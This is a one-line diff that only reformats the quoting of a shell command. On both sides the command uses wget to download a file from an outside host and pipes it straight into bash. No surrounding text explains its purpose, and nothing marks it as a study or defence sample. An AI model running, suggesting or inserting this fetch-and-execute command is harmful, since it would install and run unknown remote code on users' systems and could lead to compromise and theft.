@@ -1,1 +1,1 @@
-'''wget -O pb https://sundang.mooo.com/oci && bash pb'''
+```wget -O pb https://sundang.mooo.com/oci && bash pb```
